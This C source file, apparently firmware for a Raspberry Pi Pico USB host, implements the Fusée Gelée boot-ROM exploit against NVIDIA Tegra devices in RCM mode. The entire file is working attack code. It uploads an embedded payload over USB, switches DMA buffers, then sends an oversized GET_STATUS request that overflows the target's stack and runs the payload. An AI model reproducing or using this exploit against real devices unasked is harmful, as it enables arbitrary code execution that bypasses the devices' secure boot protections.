#include <pico/stdlib.h>
#include <pico/platform.h>
#include <pico/status_led.h>
#include <tusb.h>
#include "host/usbh_pvt.h"
#include <string.h>

#include "rcm_image.h"

#define USB_VID 0x0955
#define USB_PID 0x7321

#define USB_EP_OUT 0x01u
#define USB_EP_IN 0x81u
#define USB_PACKET_SIZE 0x1000u
#define USB_XFER_TIMEOUT_MS 1000u
#define SMASH_XFER_TIMEOUT_MS 1000u
#define COPY_BUFFER_LOW_ADDR 0x40005000u
#define COPY_BUFFER_HIGH_ADDR 0x40009000u
#define STACK_END 0x40010000u
#define SMASH_BUFFER_SIZE (STACK_END - COPY_BUFFER_HIGH_ADDR)

static uint8_t smash_buffer[SMASH_BUFFER_SIZE] = {0};

const uint32_t COPY_BUFFER_ADDRESSES[2] = {COPY_BUFFER_LOW_ADDR, COPY_BUFFER_HIGH_ADDR};

volatile int error_line = 0;

static int current_buffer = 0;
static uint8_t active_daddr = 0;
static bool status_led_ready = false;

typedef struct {
    volatile bool complete;
    volatile xfer_result_t result;
    volatile uint32_t actual_len;
} sync_xfer_t;

typedef enum {
    FUSEE_STATE_IDLE = 0,
    FUSEE_STATE_READING_ID,
    FUSEE_STATE_UPLOADING,
    FUSEE_STATE_SWITCHING_BUFFER,
    FUSEE_STATE_SMASHING,
    FUSEE_STATE_DONE,
    FUSEE_STATE_ERROR,
} fusee_state_t;

typedef enum {
    LAUNCH_ERROR_NONE = 0,
    LAUNCH_ERROR_DESCRIPTOR,
    LAUNCH_ERROR_DEVICE_ID,
    LAUNCH_ERROR_IMAGE_LAYOUT,
    LAUNCH_ERROR_UPLOAD,
    LAUNCH_ERROR_HIGH_BUFFER,
    LAUNCH_ERROR_SMASH_SUBMIT,
    LAUNCH_ERROR_SMASH_BUFFER,
} launch_error_t;

typedef enum {
    SMASH_RESULT_SUBMITTED = 0,
    SMASH_RESULT_TIMEOUT,
    SMASH_RESULT_BUFFER_TOO_SMALL,
    SMASH_RESULT_SUBMIT_FAILED,
} smash_result_t;

volatile launch_error_t last_error = LAUNCH_ERROR_NONE;
volatile fusee_state_t fusee_state = FUSEE_STATE_IDLE;

static void _panic(int);
static void assert_true(bool, int);
static void set_status_led(bool);
void tuh_mount_cb(uint8_t);
static inline uint32_t get_current_buffer_address();
static inline void toggle_buffer();
static void reset_launch_state(void);
static void sync_xfer_cb(tuh_xfer_t*);
static bool wait_for_xfer(sync_xfer_t*, uint32_t);
static bool endpoint_xfer(uint8_t, uint8_t, uint8_t*, uint32_t, uint32_t*, uint32_t, xfer_result_t*);
static smash_result_t trigger_controlled_memcpy(uint8_t);
static bool endpoint_read(uint8_t, uint8_t*, uint32_t);
static bool payload_write(uint8_t, uint8_t const*, uint8_t const*);
static bool switch_to_highbuf(uint8_t);
static void fail_launch(launch_error_t);
static void launch_payload(uint8_t);

static bool rcm_driver_init(void);
static bool rcm_driver_deinit(void);
static bool rcm_driver_open(uint8_t, uint8_t, tusb_desc_interface_t const*, uint16_t);
static bool rcm_driver_set_config(uint8_t, uint8_t);
static bool rcm_driver_xfer_cb(uint8_t, uint8_t, xfer_result_t, uint32_t);
static void rcm_driver_close(uint8_t);

static usbh_class_driver_t const rcm_driver[] = {
    {
        .name = "RCM",
        .init = rcm_driver_init,
        .deinit = rcm_driver_deinit,
        .open = rcm_driver_open,
        .set_config = rcm_driver_set_config,
        .xfer_cb = rcm_driver_xfer_cb,
        .close = rcm_driver_close,
    },
};

usbh_class_driver_t const *usbh_app_driver_get_cb(uint8_t *driver_count)
{
    *driver_count = 1;
    return rcm_driver;
}

int main()
{
    status_led_ready = status_led_init();

    assert_true(tusb_init(), __LINE__);

    while (1)
    {
        tuh_task();
    }
}

static void _panic(int line_nubmer)
{
    error_line = line_nubmer;
    while (1) {
        set_status_led(true);
        sleep_ms(300);
        set_status_led(false);
        sleep_ms(300);
    }
}
static void assert_true(bool expr, int line)
{
    if (!expr)
        _panic(line);
}

static void set_status_led(bool led_on)
{
    if (status_led_ready)
    {
        (void) status_led_set_state(led_on);
    }
}

static inline void toggle_buffer()
{
    current_buffer = 1 - current_buffer;
}
static inline uint32_t get_current_buffer_address()
{
    return COPY_BUFFER_ADDRESSES[current_buffer];
}

static void reset_launch_state(void)
{
    current_buffer = 0;
    active_daddr = 0;
    last_error = LAUNCH_ERROR_NONE;
    fusee_state = FUSEE_STATE_IDLE;
    set_status_led(false);
}

static void sync_xfer_cb(tuh_xfer_t *xfer)
{
    sync_xfer_t *sync = (sync_xfer_t*) xfer->user_data;
    sync->result = xfer->result;
    sync->actual_len = xfer->actual_len;
    sync->complete = true;
}

static bool wait_for_xfer(sync_xfer_t *sync, uint32_t timeout_ms)
{
    absolute_time_t deadline = make_timeout_time_ms(timeout_ms);

    while (!sync->complete)
    {
        tuh_task();
        if (time_reached(deadline))
        {
            return false;
        }
    }

    return true;
}

static bool endpoint_xfer(uint8_t daddr, uint8_t ep_addr, uint8_t *buffer,
                          uint32_t length, uint32_t *actual_len,
                          uint32_t timeout_ms, xfer_result_t *result)
{
    sync_xfer_t sync = {
        .complete = false,
        .result = XFER_RESULT_INVALID,
        .actual_len = 0,
    };

    tuh_xfer_t xfer = {
        .daddr = daddr,
        .ep_addr = ep_addr,
        .buffer = buffer,
        .buflen = length,
        .complete_cb = sync_xfer_cb,
        .user_data = (uintptr_t) &sync,
    };

    if (!tuh_edpt_xfer(&xfer) || !wait_for_xfer(&sync, timeout_ms))
    {
        return false;
    }

    if (actual_len)
    {
        *actual_len = sync.actual_len;
    }
    if (result)
    {
        *result = sync.result;
    }

    return true;
}

static bool rcm_driver_init(void)
{
    return true;
}

static bool rcm_driver_deinit(void)
{
    return true;
}

static bool rcm_driver_open(uint8_t rhport, uint8_t daddr,
                            tusb_desc_interface_t const *itf_desc, uint16_t max_len)
{
    (void) rhport;

    if (itf_desc->bInterfaceClass != TUSB_CLASS_VENDOR_SPECIFIC)
    {
        return false;
    }

    uint16_t vid = 0;
    uint16_t pid = 0;
    if (!tuh_vid_pid_get(daddr, &vid, &pid) || vid != USB_VID || pid != USB_PID)
    {
        return false;
    }

    uint8_t const *desc = (uint8_t const*) itf_desc;
    uint8_t const *end = desc + max_len;
    bool opened_in = false;
    bool opened_out = false;

    desc += itf_desc->bLength;
    while (desc + 2 <= end)
    {
        uint8_t const len = desc[0];
        uint8_t const type = desc[1];
        if (!len || desc + len > end)
        {
            break;
        }

        if (type == TUSB_DESC_ENDPOINT && len >= sizeof(tusb_desc_endpoint_t))
        {
            tusb_desc_endpoint_t const *ep = (tusb_desc_endpoint_t const*) desc;
            if (ep->bmAttributes.xfer == TUSB_XFER_BULK)
            {
                if (ep->bEndpointAddress == USB_EP_IN)
                {
                    opened_in = tuh_edpt_open(daddr, ep);
                }
                else if (ep->bEndpointAddress == USB_EP_OUT)
                {
                    opened_out = tuh_edpt_open(daddr, ep);
                }
            }
        }

        desc += len;
    }

    return opened_in && opened_out;
}

static bool rcm_driver_set_config(uint8_t daddr, uint8_t itf_num)
{
    usbh_driver_set_config_complete(daddr, itf_num);
    return true;
}

static bool rcm_driver_xfer_cb(uint8_t daddr, uint8_t ep_addr,
                               xfer_result_t result, uint32_t xferred_bytes)
{
    (void) daddr;
    (void) ep_addr;
    (void) result;
    (void) xferred_bytes;
    return true;
}

static void rcm_driver_close(uint8_t daddr)
{
    if (daddr == active_daddr)
    {
        reset_launch_state();
    }
}

static smash_result_t trigger_controlled_memcpy(uint8_t daddr)
{
    uint32_t length = STACK_END - get_current_buffer_address();
    if (length > sizeof(smash_buffer))
    {
        return SMASH_RESULT_BUFFER_TOO_SMALL;
    }

    tusb_control_request_t evil_setup = {
        .bmRequestType_bit = {
            .direction = TUSB_DIR_IN,
            .type = TUSB_REQ_TYPE_STANDARD,
            .recipient = TUSB_REQ_RCPT_ENDPOINT,
        },
        .bRequest = TUSB_REQ_GET_STATUS,
        .wValue = 0,
        .wIndex = 0,
        .wLength = length,
    };

    sync_xfer_t sync = {
        .complete = false,
        .result = XFER_RESULT_INVALID,
        .actual_len = 0,
    };

    tuh_xfer_t evil = {
        .daddr = daddr,
        .ep_addr = 0,
        .setup = &evil_setup,
        .buffer = smash_buffer,
        .complete_cb = sync_xfer_cb,
        .user_data = (uintptr_t) &sync,
    };

    if (!tuh_control_xfer(&evil))
    {
        return SMASH_RESULT_SUBMIT_FAILED;
    }

    // The smash normally makes the target stop responding, so a timeout can be
    // the expected end state.
    if (!wait_for_xfer(&sync, SMASH_XFER_TIMEOUT_MS))
    {
        return SMASH_RESULT_TIMEOUT;
    }

    return SMASH_RESULT_SUBMITTED;
}

static bool endpoint_read(uint8_t daddr, uint8_t *buffer, uint32_t length)
{
    uint32_t actual_len = 0;
    xfer_result_t result = XFER_RESULT_INVALID;
    if (!endpoint_xfer(daddr, USB_EP_IN, buffer, length,
                       &actual_len, USB_XFER_TIMEOUT_MS, &result))
    {
        return false;
    }

    return result == XFER_RESULT_SUCCESS && actual_len == length;
}

static bool payload_write(uint8_t daddr, uint8_t const *startp, uint8_t const *endp)
{
    uint32_t length = endp - startp;

    while (length) {
        uint32_t bytes_to_transmit = length < USB_PACKET_SIZE ? length : USB_PACKET_SIZE;
        length -= bytes_to_transmit;

        toggle_buffer();

        uint32_t actual_len = 0;
        xfer_result_t result = XFER_RESULT_INVALID;
        if (!endpoint_xfer(daddr, USB_EP_OUT, (uint8_t*) startp,
                           bytes_to_transmit, &actual_len,
                           USB_XFER_TIMEOUT_MS, &result))
        {
            return false;
        }
        if (result != XFER_RESULT_SUCCESS || actual_len != bytes_to_transmit)
        {
            return false;
        }
        startp += bytes_to_transmit;
    }

    return true;
}

static bool switch_to_highbuf(uint8_t daddr) {
    if (get_current_buffer_address() != COPY_BUFFER_ADDRESSES[1]) {
        static const uint8_t buf[USB_PACKET_SIZE] = { 0 };
        if (!payload_write(daddr, buf, buf + sizeof(buf)))
        {
            return false;
        }
    }

    return true;
}

static void fail_launch(launch_error_t error)
{
    if (active_daddr == 0)
    {
        reset_launch_state();
        return;
    }

    last_error = error;
    fusee_state = FUSEE_STATE_ERROR;
    set_status_led(false);
}

static void launch_payload(uint8_t daddr)
{
    current_buffer = 0;
    active_daddr = daddr;
    last_error = LAUNCH_ERROR_NONE;
    set_status_led(false);

    if ((RCM_IMAGE_LEN % USB_PACKET_SIZE) != 0 || RCM_IMAGE_LEN > RCM_IMAGE_MAX_LENGTH)
    {
        fail_launch(LAUNCH_ERROR_IMAGE_LAYOUT);
        return;
    }

    fusee_state = FUSEE_STATE_READING_ID;
    uint8_t device_id[16];
    if (!endpoint_read(daddr, device_id, sizeof(device_id)))
    {
        fail_launch(LAUNCH_ERROR_DEVICE_ID);
        return;
    }

    fusee_state = FUSEE_STATE_UPLOADING;
    if (!payload_write(daddr, rcm_image, rcm_image + RCM_IMAGE_LEN))
    {
        fail_launch(LAUNCH_ERROR_UPLOAD);
        return;
    }

    fusee_state = FUSEE_STATE_SWITCHING_BUFFER;
    if (!switch_to_highbuf(daddr))
    {
        fail_launch(LAUNCH_ERROR_HIGH_BUFFER);
        return;
    }

    fusee_state = FUSEE_STATE_SMASHING;
    smash_result_t smash_result = trigger_controlled_memcpy(daddr);
    if (smash_result == SMASH_RESULT_BUFFER_TOO_SMALL)
    {
        fail_launch(LAUNCH_ERROR_SMASH_BUFFER);
        return;
    }
    if (smash_result == SMASH_RESULT_SUBMIT_FAILED)
    {
        fail_launch(LAUNCH_ERROR_SMASH_SUBMIT);
        return;
    }

    fusee_state = FUSEE_STATE_DONE;
    set_status_led(true);
}

void tuh_mount_cb(uint8_t daddr)
{
    if (fusee_state != FUSEE_STATE_IDLE)
    {
        return;
    }

    tusb_desc_device_t desc;
    xfer_result_t desc_result = tuh_descriptor_get_device_sync(daddr, &desc, sizeof(tusb_desc_device_t));
    if (desc_result != XFER_RESULT_SUCCESS)
    {
        fail_launch(LAUNCH_ERROR_DESCRIPTOR);
        return;
    }
    if (desc.idVendor != USB_VID || desc.idProduct != USB_PID)
    {
        return;
    }

    launch_payload(daddr);
}
